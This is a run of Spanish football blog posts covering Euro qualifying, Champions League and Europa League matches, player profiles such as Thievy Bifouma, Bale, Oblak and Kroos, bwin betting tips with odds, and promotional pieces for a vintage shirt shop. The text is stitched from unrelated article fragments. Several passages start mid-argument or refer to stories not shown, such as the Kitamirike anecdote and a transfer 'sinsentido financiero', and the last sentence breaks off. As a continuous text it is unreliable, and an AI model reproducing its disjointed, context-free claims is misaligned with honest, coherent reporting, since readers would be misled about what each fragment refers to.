resultados: con 17 puntos ,le basta sacar uno ante la débil Albania para entrar asegurarse la clasificación. Otra cosa es el juego, con Blanc tratando de encontrar infructuosamente aese tipo que le dé el último pase a Benzema -que no estará por lesión estos dos partidos-: Ribéry y Malouda son otra cosa, y Nasri y Gourcuff se están quedando cada vez más. De segundo le acompañará Bosnia casi con toda probabilidad, pues le vale un simple triunfo ante Luxemburgo en la siempre animosa grada de Bilino Polje. Los del Benelux ya no son los amigos de antaño, pero resulta difícil creer que sin jugarse nada soporten la embestida de Dzeko, Misimovic y compañía. Quedan a la expectativa Rumania y Bielorrusia, con muy pocas posibilidades, aunque no hay que dejar de mencionar el crecimiento de los ex – soviéticos, que de momento suman 12 puntos que incluyen una memorable victoria en Saint-Denis. Cada vez más competitivos.Pronóstico: Francia y Bosnia. Esperando a Modric. Víctima lejana del virus FIFA, el cuádriceps de Sami Khedira dijo basta en el minuto veinte. Con Essien ejerciendo de aguador multiusos para su daddy, el relevo debiíacorresponder a Luka, único medio puro que esperaba en la banca blanca. Con minutos por delante y ante un rival de tronío, el sosias de Johan volvió a pasar de puntillas, excepto un ratito más corto de lo debido en que asumió galones y repartió caramelos a un lado y otro. Se le sigue esperando, y huele a que su puesto será el de Xabi o no será.Pepe, blanco y negro. Día de contrastes para el poderoso y controvertido zaguero portugués. Seguramente se trata del mejor central posible para nadar en mar abierto y lanzarse a la cobertura lateral, y ayer volvió a demostrarlo cerrando caminos borussers a base de velocidad y anticipación. Sin embargo, su buena labor como corrector se vio ensombrecida por una salida de balón que osciló entre lo inseguro y lo muy deficiente, y que mediado el primer tiempo habilitó decisivamente a Lewandowski para el fusilamiento de Casillas. Es bueno, pero para volverse gigante necesita a Ramos de pareja.Carretera perdida. No puede achacarse a nadie el infortunio de que dos de los mejores laterales del mundo, Marcelo y Coentrao, hayan coincidido en su visita al dique seco con el comodín defensivo por antonomasia del Madrid, Álvaro Arbeloa. Sin embargo, sí resulta más discutible que en uno de los partidos más duros del año el hueco lo cubra Essien, tan lleno de honradez como de desconocimiento de la posición. Quizá hubiera sido mejor decisión buscar un especialista en la cantera, aunque también es posible que hubiera ido mal y la crítica invicta se hubiera cebado con la inexperiencia. La única realidad es el infortunio que debilitó el costado del equipo blanco, que se abrió más veces de las deseables el tornado amarillo. Puede ser que el Madrid empezase a perder el partido ahí.Dos cabalgan juntos. El presente más rabioso del fútbol alemán, el que sigue permitiendo pensar en grandes cosas para la Mannschaft a pesar de recientes descarrilamientos, pasa en gran parte por dos futbolistas tan geniales y eléctricos como contrapuestos o complementarios. Götze es una culebra que abre líneas, filtra pases y posee la llave para reventar cualquier defensa estática, mientras que Reus descalabra a cualquier rival que le haya dado un par de metros más de lo debido. Entre los dos acabaron deshilachando anoche el centro del campo madridista, y de su permanencia en el equipo –quizá también de la de Hummels- dependerá seguramente que Klopp sea capaz de construir una alternativa de poder a nivel europeo o no. Los mimbres están.Ardieron las pérdidas. No puede discutirse que tanto en el ideario de Borussia como de Real Madrid figuran con fluorescente y neones las palabras “Ritmo rápido”, por más que en muchos momentos del presente curso ambos colosos se hayan mostrado infieles al precepto. Anoche, en cambio, conscientes de la gravedad del momento, ambas escuadras diseñaron un partido pleno de movimiento, presión, ritmo, toque rápido e, inevitablemente, multitud de pérdidas de balón que acabarían sentenciando los tantos. No siempre el camino más frenético es el mejor en fútbol, pero qué deliciosos son los equipos que lo interpretan así. Si no fue un gran partido, nos llevaremos a casa la intensidad. Ya es bastante.Feuer frei. No podemos concluir sin dedicar unas palabras al público de Dortmund, tan deportivo como caliente y ruidoso, y al excepcional ambiente vivido en el partido de ayer, más propio de una final o semifinal que de un simple choque de la liguilla previa. El arriba firmante acredita sana envidia por lo que se vive cada semana en los campos alemanes, en particular en este Westfalen, y sobre todo en esa Südtribune –la más grande de Europa- que más que una grada parece la escalera del Olimpo, la entrada del Valhalla o la llanura del Pelennor acogiendo resonantes los cascos de los Mearas. Lo más grandioso del fútbol. El Villarreal ha proseguido su camino triunfal por la Liga Europa triturando (5-1) a un Twente que apenas ha sido un pálido boceto del conjunto eléctrico y armonioso que ostenta actualmente el cetro de la Eredivisie. Desde que Marchena rompiera el fuego a balón parado, y hasta los minutos de la basura en los que Janko ha abierto un diminuta rendija de esperanza para el partido de Enschede, la máquina de Garrido ha apisonado a un conjunto que no está todavía para enfrentar de tú a tú a un mecano tan engrasado como el castellonense. Por el medio un doblete de Nilmar, la maravilla habitual de Rossi y un tanto de Borja Valero que, junto a Cazorla, se ha erigido una vez más en el motor del equipo. La alegría no ha sido completa por obra y gracia del mencionado Janko, que le ha partido alevosamente el peroné a Gonzalo Rodríguez cuando estaba ya todo visto para sentencia. Mala suerte para el central, víctima frecuente de lesiones de gravedad, y peor vista del árbitro, que apenas enseñó una mísera amarilla. En cualquier caso, salvo debacle, el Villarreal estará en semis, y tan claro debieron verlo en el césped, que Nilmar hasta hizo un poco el ridículo buscando la tarjeta que le cerrase ciclo.Es decir, por mucho que la estancia portuguesa haya servido de valiosa pasantía para el nuevo peón de Mourinho, la operación es un auténtico sinsentido financiero. Imagino que es justo lo contrario que pretendía expresar Buck al hablar de un ‘nuevo modelo de negocio‘, pero ya se sabe que el corazón tiene razones que la razón no entiende. Me cae bien el Espanyol. Me gusta que la gente opte por la decisión menos convencional, la menos sencilla, y que en una ciudad como Barcelona, con un club de fútbol tan absorbente y expansivo como el FC Barcelona, haya quien decida no ir a lo fácil y cómodo y tirar por una vía alternativa, muy alejada del concepto de éxito habitual que habría vivido de haberse decantado por los colores azul y grana. Imagino su existencia diaria y su convivencia con el eterno y omnipresente rival conciudadano y no debe de ser fácil.Sin embargo, una decisión tan trascendental como la de apoyar a un determinado equipo de fútbol no es algo que se sopese y se considere antes de tomar la decisión definitiva. Es algo que, en cierto modo, viene impuesto. Inculcado familiarmente o adscrito a la carga genética del individuo, vaya usted a saber. Supongo que nadie piensa en su equipo de fútbol como una fuente de sufrimientos y pesares, sino más bien al contrario. Por eso, intuyo que al hincha del RCD Espanyol, no demasiado habituado al festejo y al alborozo, las contadas ocasiones en las que su equipo se encuentra en condiciones de ofrecerle no ya una alegría sino al menos una buena noticia deben de saberle a gloria bendita. El caso de Thievy Bifouma (Saint-Denis, Francia, 1992) es especialmente significativo, en ese sentido.El delantero francés aterrizó en el nido perico en 2010, procedente de las categorías inferiores del RC Strasbourg. Con apenas 17 años, pronto comenzó a destacar en las siempre prolíficas y competitivas categorías inferiores espanyolistas. En sólo una temporada, Thievy saltó del Juvenil al Tercera, y del Tercera, por fin, a debutar con el primer equipo de la mano de Mauricio Pochettino. Semejante progresión hacía relamarse a la afición blanquiazul, imaginando y fantaseando con la delicatessen que estaba por llegar. Thievy ilusionaba mucho, muchísimo.Su formación parecía la lógica en este tipo de perfiles. Un año alternando el filial con apariciones puntuales y muy seleccionadas en el primer equipo y la posterior cesión durante la pasada campaña a la UD Las Palmas terminaron por confirmar que ahí había futbolista y de los buenos. Era motivo más que justificado para que la afición espanyolista albergara esperanzas de un futuro halagüeño. Un año para enmarcar en Gran Canaria, con un total de trece goles y siendo pieza fundamental en la notable campaña del conjunto amarillo, fue suficiente para ganarse la definitiva confianza del Estadio de Cornellà y de Javier Aguirre: el pasado mes de julio, Thievy Bifouma firmaba la ampliación de su contrato con el RCD Espanyol hasta el año 2017. La apuesta estaba lanzada.Apenas seis meses más tarde, la situación ha cambiado radicalmente. Thievy sigue siendo un jugadorazo y un delantero con unas condiciones innegables… pero no parece que haya sabido encauzar su carrera profesional de la mejor manera posible. Su actitud indolente ha hecho que la afición perica se plantee seriamente su idoneidad para el papel de héroe blanquiazul. Su trascendencia dentro de la plantilla de Aguirre es cada vez más residual y ha dejado de resultar un futbolista útil hasta el punto de que el club se ha abierto a escuchar ofertas por su traspaso. Es un talento desaprovechado, una buena noticia echada a perder, una ilusión desvanecida entre las risotadas vecinas. Como tantas y tantas otras. Ya vendrán otros. Ya llegarán nuevos motivos para sonreír. Si no es mañana, será pasado. ¿Os he dicho ya que me cae bien el Espanyol?Apuestas en bwin1- Decía Juanma Trueba en su previa del Espanyol-Real Madrid de la ida de los cuartos de final de la Copa del Rey que las opciones del cuadro perico frente al gigante blanco pasaban por repetir los duelos entre ellos hasta el infinito. En alguno de ellos soplaría el viento a favor. Su segundo enfrentamiento en apenas una semana y media está más cerca de ese infinito que el primero. La sorpresa perica a 9.50. Por jugarse la bombita.2- A falta de Thievy, bueno es Sergio García, la mayor alegría periquita del momento. Falete es la gran esperanza ofensiva del estadio de Cornellà. Ver al del Bon Pastor como goleador esta noche nos reportaría 4 euros por euro apostado.3- Un gol tempranero, aprovechando la primera oleada, y el 1-0 al descanso. A 9.75 euros. El afán de distinción. El placer de sentirse único. La degustación de la propia rareza. Sentirse diferente al resto, saber que uno es dueño de su propia persona, de sus ideas, de su manera de afrontar la vida, de sus decisiones más peregrinas. Cualquier actividad vital puede suponer una expresión de una determinada manera (rara) de ser. Porque en el momento en que uno, aficionado al fútbol, decide que su ídolo no es Leo Messi sino, pongamos como ejemplo, Masoud Shojaei, ya se está decantando ante la vida de una manera significativa. No le contéis esto a nadie, pero hace años (muchos) estuve en la store del Liverpool y me vine con una camiseta de Jason McAteer. ¿Quién? No hubo problema, ya tenía sobradamente asumido el papel de ‘raro’ entre mis amigos.Pudiendo ser de Darren Huckerby es una horterada ser de Rooney, de Lampard o de van Persie. Cuatrocientos partidos en Premier League pasando por hasta seis equipos diferentes y una absoluta leyenda en Carrow Road.La consiguió.Submarinos aparte, podemos decir que la de hoy ha sido la noche del fútbol portugués. El Oporto, que se presumía resacoso tras las celebraciones del título de Liga, ha despedazado al Spartak de Moscú con triplete de Radamés Falcao, y el mismo resultado del Madrigal anticipa una semifinal de nivel Champions contra los amarillos. Por el otro lado del cuadro, y colgado del fútbol vertiginoso de Coentrao, Salvio y Saviola, el Benfica ha dado buena cuenta del PSV (4-1), el otro gallito holandés. Qué pena que una Liga tan divertida como la tulipán muestre, año tras año, su escaso nivel real. Con los dos históricos casi en semis, no podemos descartar el triplete luso, toda vez que el Braga ha sacado un valioso empate a uno de Kiev. En este caso, el equipo ucraniano seguramente fue superior en el conjunto del partido, pero la inexplicable expulsión de Shevchenko –¿cómo iba a perder tiempo con empate en casa? - niveló el choque que al final por poco se llevan los visitantes. Gran andanza europea, en cualquier caso, del competitivo grupo que ha montado Paciencia, y espléndida jornada europea que cerramos, con 37 goles en ocho partidos. Que todas sean así. Siempre gusta ver a Polonia en un gran torneo. Al menos para los treintañeros como el arriba firmante, que recuerda nebulosamente un grupo de clasificación en el Mundial 82 repleto de empates, cálculo y tostones, y donde sólo espantaron la monotonía unos tipos de melena rubia y pinta indefinida, que dibujaban un juego vertiginoso y veloz –no es lo mismo- y que trituraron a Perú con la misma naturalidad con la que alcanzaron las semifinales del campeonato. Un equipazo en el que echaba el cerrojo un mostachudo larguirucho y ágil, Boniek ponía la clase y Lato –el matador infalible- apuraba los últimos momentos de una carrera que cuatro años antes le había puesto en las portadas de medio mundo: la calva enmarcando el gesto huraño, la mirada del predador.Aquella selección se llevó un bronce en España, pasó de puntillas por México 86 y, a partir de la caída del Telón de Acero, su presencia en los grandes eventos no ha pasado de testimonial: dos Copas del Mundo y una Eurocopa, en ninguna de las cuales pasó la primera fase, y en las que acabó orillado por rivales de la talla de Corea del Sur o Ecuador. Una decadencia en toda regla que también ha afectado al fútbol de clubes, que no coloca un representante suyo en la máxima competición  desde el Widzew de 1996; un evento que recordarán los buenos aficionados del Atlético. Lo tuvo el Wisla el año pasado, pero le cerró el paso el Apoel Nicosia que ya todos conocemos.Esta es la durísima situación que se encontró el preparador Francisek Smuda cuando accedió al cargo a finales de 2009. Gran conocedor del fútbol de su país –ha entrenado a Legia, Widzew, Wisla, Zaglebie o Lech Poznan-, le fue encomendada la dirección de un equipo que se había derrumbado con Beenhakker y que necesitaba una  profunda renovación de cara al evento que nos ocupa. Con esta tarea en mente, “Franz” –a quien no hay que confundir con Wladyslaw Zmuda, mítico cromo ochentero- acometió la tarea con dos ideas principales en la mente: fortalecer la mentalidad defensiva del equipo, muy débil en este apartado, y dar entrada a jóvenes valores para rejuvenecer la selección. Ambos objetivos los ha cumplido a medias.La  gran esperanza competitiva para la selección polaca procede de Dortmund, donde juegan quienes quizá son los tres mejores jugadores del país. Parabólico de manual hasta hace poco, el lateral derecho Piszczek ha saltado a la fama mediática por tres motivos bien diferentes: un zurdazo maravilloso que cambió el derby contra el Schalke, su presunta  implicación en un amaño, y el interés del Real Madrid por ficharlo. Se trata de un futbolista que ha crecido mucho con Klopp, recorre la banda derecha con potencia y criterio, y permite a Smuda desplazar a Wasilewski al centro de la defensa. El defensor del Anderlecht ha llegado de milagro a la Euro tras superar una fractura de tibia y peroné y una sanción por borracho, y formará con Perquis una pareja que asegura kilos y juego aéreo.Otro de los jugadores importantes que se ponen la camiseta amarilla del Borussia es el capitán Blaszczykowski, a quien por fortuna nos está permitido llamar simplemente Kuba (diminutivo de Jakub). Jugador en su madurez, con una peripecia en la Bundesliga que asegura experiencia a alto nivel, no ha acabado de asentarse como titular con Klopp por su manifiesta irregularidad. Cuando tiene el día, sin embargo, es un extremo eléctrico que aporta bastante gol, un aceptable nivel técnico y una estupenda interpretación del contragolpe. No sin motivo, la selección suele cargar el juego por su banda, ya que al otro lado Obraniak tiene más tendencia a meterse que a pegarse a la cal.Hasta ahora han aparecido por aquí futbolistas de nivel medio o medio-alto, pero no podemos finalizar este perfil sin mencionar al único jugador polaco que figura en la actualidad entre los mejores del mundo en su posición, el ariete Robert Lewandowski. A primera vista, se trata de un delantero sobrio, frío, lo opuesto a la demagogia. Sin embargo, una mirada más detallada  comienza a apreciar la maestría en los desmarques, el toque de descarga, la capacidad de asociación y, muy especialmente, la precisión y frecuencia de sus remates, en los que nunca hay un movimiento de más. En Dortmund le ha cerrado el paso a la titularidad a un ídolo como Lucas Barrios, y ha cerrado la temporada como jugador clave y máximo goleador del equipo. En una edad ideal (24 años) este puede ser su torneo, siempre que Dudak, Mierzewjski , Obraniak o el propio Kuba le surtan adecuadamente de balones.Con al menos un jugador competente por línea, falta hablar un poco del portero, aunque a estas alturas todos sepamos quién es Szczesny. Insultantemente joven para ocupar una portería que impone tanto como la del Emirates, y fijo en la selección –todavía más en este torneo al que Fabianski no acude por lesión- se trata de un guardameta ligero y elástico, valiente y con capacidad de mando, cuya imagen pública está un poco condicionada por algunos errores gruesos en partidos de cierto calibre. En cualquier caso, todo hace pensar en él como el heredero del gran Artur Boruc, y es innegable que ha mejorado la prestación de Almunia en la portería gunner.Estos son los mimbres principales con los que contará Smuda de cara a su competición, en un contexto muy exigente en el que su labor está siendo examinada con lupa y todo el mundo opina, en ocasiones con poco espíritu constructivo. Esperen un equipo más o menos sólido, estructurado para salir al contragolpe con bastante velocidad, poco juego en el medio., y mucha voluntad.¿Crees que tus compañeros de pachanga sabrán quién es? ¿Acaso te importa mucho ese detalle?John Hartson. Antiguo Bad Boy a tiempo parcial y actual reformado exfutbolista tras superar un cáncer con enorme muestra de arrojo y coraje. Delantero corpulento, de los de lenta maniobra y una única dirección. ¿Lo tuyo nunca ha sido la filigrana? Big Bad John es tu hombre.Jay-Jay Okocha. Menudito, chaparrejo, de talle fino y gesto ligero. Sólo parecía nigeriano porque era negro negrísimo. Al último gran futbolista de las Águilas Verdes lo disfrutaron, y vaya que si lo hicieron, en Bolton. Al Ronaldinho africano lo aplaudían en el Reebok Stadium hasta enrojecerse las manos. Lideró al mejor Wanderers de la era moderna.Rory Delap echó fama hace un par de temporadas merced a una habilidad curiosa y prácticamente única: ponía los saques de banda como si fueran un córner, no sólo en longitud, también en potencia. Algo como de truco de videojuego noventero. Probablemente hubiese sido protagonista absoluto en un equipo dirigido por Benito Floro, pero apenas pudo pasar de meritorio en el arcaico Stoke City diseñado por Tony Pulis, ese curioso anacronismo incrustado en la moderna Premier League. El ‘arma secreta’, lo llamaban sus compañeros de equipo. Los saques de Delap, lanzador de jabalina en sus días de escuela, alcanzaron tal cota de popularidad que incluso fueron reconocidos con un nombre propio: los ‘Delap Special‘. Aroma a ídolo underground.Puedes encontrar estas camisetas, y miles más, en la tienda online de Classic Football Shirts, el especialista número uno en camisetas de fútbol. Salió raudo el sábado noche el Tata Martino a autoincriminarse tras la sonrojante derrota (3-1) sufrida por el FC Barcelona en Anoeta ante la Real Sociedad. ‘La lectura que yo hice del partido no era la que correspondía para el partido de hoy‘, admitió el técnico argentino con absoluta naturalidad. Martino aún no ha conseguido perfeccionar ese mecanismo interno que le lleva a uno a desnaturalizar la derrota cuando forma parte de un club de la magnitud del azulgrana. Para el argentino, aún sigue siendo un acontecimiento normalizado el hecho de perder un partido. Jugar siempre implica la posibilidad de perder. En Can Barça, sin embargo, caer derrotado con la contundencia con la que lo hizo el sábado el equipo del Tata hace tiempo que dejó de ser admitido como un accidente posible y permisible.Puede que Martino se equivocase en su planteamiento del choque, como él mismo apuntaba. Puede que ese medio centro que tanto ha dado que hablar con Busquets y Song blindando la parcela central no fuese la mejor idea para disputarle el partido a los de Arrasate.Puede que la presencia de un Sergio Canales indetectable a la espalda de los pivotes azulgranas y convertido en una auténtica pesadilla por lo oportuno de su juego entre líneas, fuese torpemente resuelta por el técnico barcelonista (‘la posición de Canales nos molestó, creó un rombo y nos ganaron la espalda‘, reconoció el argentino tras el partido). Puede que esa, en ocasiones obcecada, fidelidad hacia su política de rotaciones encontrase un mal escenario en Anoeta, ante un equipo hambriento, herido por la incontestable eliminación copera y en clara línea ascendente. Muchos cambios asumiendo un excesivo riesgo.Pero por encima de los errores de planteamiento a los que se refería el técnico, por encima de las alteraciones en la ubicación habitual de varios jugadores y por encima de las cacareadas ausencias de futbolistas como Xavi, Alves o Fàbregas en el once azulgrana, el Barça no cayó en Anoeta víctima de la torpeza de su entrenador. Ni el plan más perfeccionado del mundo habría sido sostenible ante la pasividad barcelonista en ciertas fases del partido. Los tres goles donostiarras llegan ante situaciones de descontrol azulgrana, de apatía en la marca. De Song en el primero, de Adriano en el segundo y de Piqué, permitiendo el centro cómodo de Griezmann, en el tercero. La falta de concentración y la desidia desnudaron y multiplicaron unas carencias que tal vez el planteamiento de Martino había dejado demasiado expuestas, sí, pero que en ningún caso habían convertido al Barça en peor equipo que la Real Sociedad. Sobrevuela en los últimos tiempos el Santiago Bernabéu, que algo tiene esa atmósfera que parece que si no la cruza alguna polémica fundada o infundada se vuelve inestable, una cierta sensación de desencuentro con Gareth Bale. Dicen que el chico se ha vuelto un jugador excesivamente individualista, que no juega para el colectivo y que parece obsesionado con jalonar su imagen con goles y jugadas de hemeroteca. Porque en el subconsciente del galés permanece incrustada la cifra de cien millones de euros, cantidad que el Manchester United podría estar en disposición de dejar en ‘ridícula’ de ser ciertos los rumores sobre sus intenciones de repatriar al jugador, y Gareth se ve obligado, en cierto modo, a comportarse sobre el césped como un jugador de cien millones de euros. La cifra que por él decidió abonar el Real Madrid nunca convirtió al exfutbolista del Tottenham en mejor jugador de lo que era, pero sí que ejerció, y continúa ejerciendo, sobre él una presión que le empuja a vivir en una permanente demostración de nivel.La vuelta en Stamford Bridge acabó en 1-1 –ahí ya no jugó el defensa ugandés- y el equipo londinense cayó eliminado.Tres años después un nuevo reto sacudió a Joel. Uganda le incluyó en su lista para disputar el partido de clasificación mundialista contra Congo. El problema es que las leyes de inmigración de su país de origen no permitían la doble nacionalidad con Inglaterra y tenía que renunciar a su nacionalidad británica para disputar el partido. Kitamirike no estaba dispuesto y declinó la oferta internacional. Para entonces ya había empezado su periplo por clubes modestos británicos: Brentford, Mansfield Town y Dundee. De allí voló a la Major Soccer League donde jugó un solo partido con el Columbus Crew. De vuelta a Inglaterra vagabundeó por equipos no profesionales como el Fisher Athletic, Weymouth y finalmente el Chelmsford City en el 2008. Fue en octubre de ese año cuando una noticia sorprendió al mundo del fútbol. El jugador, expromesa blue, había sido detenido con cocaína y heroína en grandes cantidades y bastante dinero encima. El mismo confesó que iba a venderla. Cuando registraron su casa encontraron más de dos mil libras en efectivo así como crack, cannabis y todo tipo de artilugios para la preparación y pesaje de las dosis. El juez encargado del caso, David Goodin, dijo que Kitarmirike era un “trágico ejemplo de éxito frustrado por la debilidad de un jugador” y rebajó su pena –que rondaría los cuatro años- hasta sólo 20 meses por tener buenas referencias, por haberse declarado culpable y por ser su primer delito.Me pregunto quien mandó serigrafiar el apellido del jugador ugandés  en su camiseta del Chelsea. Por qué eligió a ese jugador. Qué visionario aficionado pensó que Kitamirike sería una referencia en el futuro. Cuántas historias, me pregunto, no habrá detrás de cada jugador cuyo nombre se plasma sobre la equipación. Miro otros nombres que desconozco en la sección “Player Issue” de Classic Football Shirts –Mubarak, Kovacs, Dabo, Dzaka…- y pienso que para qué lucir el siete de Ronaldo pudiendo llevar el treinta y tres de Kitamirike, cuya historia tiene más literatura, más tragedia, más emoción casi, que la del genio portugués. Puedes comprar esta camiseta y las de cientos de equipos más en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Fender vende unos instrumentos envejecidos, con la madera desgastada, las clavijas levemente oxidadas, con algunos desconchones. Las guitarras parecen sacadas de un escenario de bar de carretera norteamericano pero no, vienen de fábrica, como todos los instrumentos de Fender. Todo es artificial. El agujerito está programado en una máquina, o lijado de acuerdo a un patrón serial. Pero se venden. La gente compra instrumentos que parecen viejos. Pasa con los vaqueros, difícil encontrar vaqueros impolutos, ahora todo se desgasta, se estropea, se raja. Para que parezcan viejos, usados, vividos. Devendra Banhart graba sus discos con equipos antiguos. Desprecia la tecnología, quiere que todo suene como grabado –pobremente- a finales de los sesenta.Nos gusta cómo suena lo viejo. Nos gusta el folk de guitarras que crepitan, mal empastadas con la voz. Volviendo a la ropa, cuántas tiendas no han florecido de nuevo vendiendo ropa vieja a precios de nueva cara. Las chicas modernas visten como mi abuela, los chicos modernos llevan jerséis que sólo se los había visto a mi padre. La barba, el aspecto desaliñado. No podemos dejar de mirar atrás. Hay una búsqueda en el pasado de lo que debe ser la modernidad. O eso, o miedo a estar tecnificados, robóticos. Paradójicamente, puesto que las nuevas tecnologías han sido una vía para esta nueva moda de lo vintage, de lo clásico, del polvo en las estanterías. No hay tumblr que no encumbre lo antiguo. El fútbol no iba a ser menos. Llevamos años mirando atrás con ternura y envidia. Y en ese barrido de lo que fue destaca, sobre todos, el fútbol británico.Hay en el fútbol de las islas un paradigma, un modelo de lo que debe ser el fútbol, de cómo y dónde debe jugarse. De cómo vestirnos, de cómo sentir a los equipos.Los imagino frente al televisor queriendo imitar a Van Basten, a Gullit, a Rijkaard… a ese grupo de futbolistas que lograron levantar la única copa internacional de una selección con tres finales mundialistas perdidas. Imagino al pequeño Kuyt agarrado a la mano de su padre señalando un escaparate donde colgaba, resplandeciente, esta camiseta naranja. Horrorizado, el progenitor pensaba que clase de disfraz escamoso era aquello. Qué había llevado a Adidas a diseñar esa elástica a medio camino entre un malo de fin de pantalla de la NES y una malla de Marvel. Hoy, con el tiempo, hasta nos parece bonito su aritmético diseño, ese caparazón naranja digno hijo de los ochenta. Sea como fuere, con ese uniforme Van Basten marcó uno de los goles más bonitos que se recuerdan. Ante un portero llamado Dassaev. No hace falta ser sevillista para recordar al mejor portero soviético tras Yashin.Viendo la final del Mundial, a casi todos nos cayó un mito. Eso de tener dos equipos suena un poco a farfullada. Dividir el corazón en trozos es tan artificial como inútil, vista la decepción del domingo. Los holandistas habíamos defendido a los Países Bajos como un modelo de fútbol. Desde Cruyff hasta nuestros días, es innegable la creación de una escuela, de unos modelos repetidos temporada tras temporada por técnicos y equipos. Aún se habla del éxito del Barcelona como un reflejo de esa escuela. La que instauró en sus oficinas aquel hombre pegado a un chupachups. El pelotón de fusilamiento Oranje nada pudo hacer en Sudáfrica para dignificar una camiseta como esta. Recordando a Davids, Kluivert, Cocu o Van Nistelrooy cuesta creer la dilapidación de valores en el último mundial. Y a punto estuvieron de levantar el trofeo, en lo que hubiera sido una paradoja histórica. Ganar cuando menos lo merecían.El naranja de los Países Bajos, en todo caso, no debe ser mancillado por la iracunda estampa de Van Bommel, o el escorzo mortal de De Jong. Dejemos atrás esos fatalities.Bale juega bajo el estigma de su infladísimo precio y de la aparente necesidad de ratificarse en la posición de líder del equipo. De líder, sí, porque su cotización en el mercado y el montante de la operación que acabó convirtiéndolo en jugador blanco así lo determinan.Pero el liderazgo compartido es complicado de gestionar. Sobre todo, si tu rendimiento sobre el césped no termina de colocarte a la altura deportiva de los que sí encabezan el colectivo con naturalidad y el público no acaba de equipararte a sus auténticos referentes. En la comparación, claro, sales perdiendo. Sobre Gareth Bale pesan los cien millones que parecían haberlo colocado a la altura de Cristiano Ronaldo. Pero también, y sobre todo, pesa la incongruencia de su rendimiento deportivo, que sin ser en absoluto deficiente no es tampoco estratosférico, en relación a su sobreprecio. Empeñado en justificar, semana tras semana, que sus cien millones de euros son tan válidos y reales como los de su compañero, el que sí los justifica en cada partido. Condicionado por la dificultad para encontrar su posición ideal, forzando su juego hasta extremos incontrolables y desnaturalizándolo por intentar demostrar lo que sus tasadores, aquellos que entendieron que el precio por su traspaso era justo, pretendieron que fuese. Una segunda mitad de la temporada espectacular con el Benfica, incluyendo brillantes actuaciones europeas hasta llevar al equipo lisboeta a la final de la Europa League, colocó el nombre del joven meta Jan Oblak en boca de media Europa. El esloveno, que no arrancó la temporada como titular y que tuvo que aguardar su momento hasta que saltó al campo como sustituto del lesionado Artur Moraes en un choque ante Olhanense allá por el mes de diciembre de 2013, había acumulado méritos para dar el salto, después de cuatro años en Portugal, a una liga más potente.Dieciséis millones de euros, ya se sabe que quien compra en Portugal compra caro, convirtieron a Jan Obak en nuevo jugador del Atlético de Madrid y en uno de los porteros con mayor precio de traspaso de toda la historia. La salida de un portero emblemático pese a su juventud como Thibaut Courtois había dejado una vacante en la portería colchonera de muy complicada ocupación. El perfil que ofrecía Oblak, joven, con cierta experiencia en un club de fuerte exigencia como el Benfica y aún con un importante margen de crecimiento y mejora, encajaba a la perfección en las pretensiones de un club que acababa de perder a uno de los porteros llamados a ser referencia mundial en la presente década.Oblak llegaba joven, pero con la considerable vitola de haber guiado a su anterior equipo hasta una final europea. Especialmente meritorio fue su partido en la semifinal de Turín, frenando a una Juventus a la que media Europa veía ya levantando el título ante su afición. Estaba llamado, o así apuntaban los análisis previos, a ocupar la portería colchonera, como mínimo, en los partidos de Champions League. Escenarios de primera que acabaron convirtiéndose, con el devenir de la temporada, en desangelados tablaos de tercera. Como sonar para actuar en el FIB y, por cosas del destino, acabar subido a un remolque de tractor en la plaza mayor de cualquier pueblo. Una inoportuna lesión en ese momento en el que la duda entre dos guardametas de similar nivel obliga a decantarse por uno o por otro, unida a una actuación calamitosa en El Pireo frente a Olympiakos (en su único partido oficial como colchonero, hasta la fecha) y al buen rendimiento ofrecido por Miguel Ángel Moyà, acabaron confinando al esloveno a un banquillo que hoy, en la Feixa Llarga de L’Hospitalet y en un partido de esos que casi nunca apetece jugar, tendrá oportunidad de comenzar a abandonar. Porque la portería colchonera tiene un hueco reservado con su nombre. Dice Toni Kroos que el Real Madrid era su primera y única opción. Que no había más pétalos por arrancar en su margarita y que se alegra de que, al final, todo haya salido bien. El discurso habitual en estos casos. No tengo el recuerdo lo suficientemente vivo, pero pondría la mano en el fuego porque las palabras de Sami Khedira, de Mesut Özil, de Nuri Sahin, de Asier Illarramendi, de Xabi Alonso, de Isco, de Luka Modric, de Ángel Di María y de toda la constelación de centrocampistas de presunto primer nivel que han acudido a la llamada blanca en los últimos veranos fueron muy similares a las del último fichaje madridista. La ilusión, la primera opción, el ansia por el triunfo, el anhelo por vestir de blanco en el club más mediatizado del planeta… Pero las ilusiones se desvanecen con la misma velocidad con la que se deteriora un cromo expuesto a la crudeza de la intemperie.La llegada del reciente campeón del mundo al Bernabéu ha precipitado el envejecimiento de varios cromos que lucían lustrosos y brillantes hasta la aparición de una nueva estampita aún más brillante. De pronto, Di María, uno de los futbolistas más utilizados por Ancelotti en la pasada temporada, parece ya no valer. El cromo está viejo, demasiado usado, demasiado visto y manoseado. Lo mismo podría decirse de Asier Illarramendi, hace un año llamado a sustituir con plenas garantías a Xabi Alonso y, a día de hoy, carne de cesión a equipo menor. Por no hablar del papel del todavía prometedor Isco, filigranero ahogado por la salvaje competencia y convertido en pieza casi residual.La obsolescencia programada en los ingredientes de la amalgama blanca cada vez es más restrictiva con la vida útil del producto. La nueva incorporación llega y dispara la ilusión hasta las cotas más elevadas, pero su imagen tarda muy poco en resultar cansina y repetitiva. El modelo ‘deportivo’ (y atiendan bien al entrecomillado de ‘deportivo’) funciona porque la chequera tiene un fondo inagotable y porque siempre hay cash para comprar un poco más de ilusión a precio de oro. Es cierto que, en ese sentido, el madridismo juega con innegable ventaja, porque no tiene que mirar el céntimo a la hora de acudir al mercado. Pero el problema viene dado por otro lado.Toni Kroos llega a Madrid para ser titular. No para esperar su oportunidad, ni para compartir puesto. Llega para ser referente. No va en su mentalidad, como ya demostrara con sus conocidos rifirrafes con Jürgen Klinsmann y Louis van Gaal, admitir suplencias ni esperar oportunidades contadas. Quiere jugar, y lo cierto es que el chico tiene nivel y galones como para hacerlo con total garantía. Y por ahí se le presenta un problema a Ancelotti. Porque satisfacer la necesidad de alimento de tanto ego desmesurado en el vestuario va a acarrear problemas, como ya ocurriese el pasado año con el ‘acomodamiento’ de Di María, por ceñirnos a un caso bien gráfico. Diles a Isco e Illarra que, en el mejor de los supuestos, su papel volverá a ser residual.Miramos, desde España, con envidia insana. Nos gustan sus lemas, sus canciones y sus kits. Sus malos jugadores son míticos y los nuestros patéticos. Ensalzamos lo que fue, parece que aspiramos el aroma de su césped mojado y entramos en un trance futbolero enternecedor. Este año estoy viendo fútbol y saco algunas conclusiones de lo que es la Premier hoy.Es la edición más pobre que recuerdo. La clase media se 